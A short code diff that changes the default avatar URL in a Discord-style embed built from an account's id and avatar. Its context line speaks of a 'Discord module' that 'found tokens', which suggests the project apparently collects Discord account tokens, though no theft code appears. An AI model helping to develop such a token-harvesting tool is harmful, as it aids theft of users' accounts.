@@ -571,7 +571,7 @@ This file indicates that the Discord module found tokens but couldn't process th
             thumbnail: {
                 url: account.avatar ? 
                     `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : 
-                    'https://cdn.discordapp.com/embed/avatars/0.png'
+                    'https://cdn.discordapp.com/embed/avatars/0.png?format=webp&quality=lossless'
             },
             fields: [
                 {
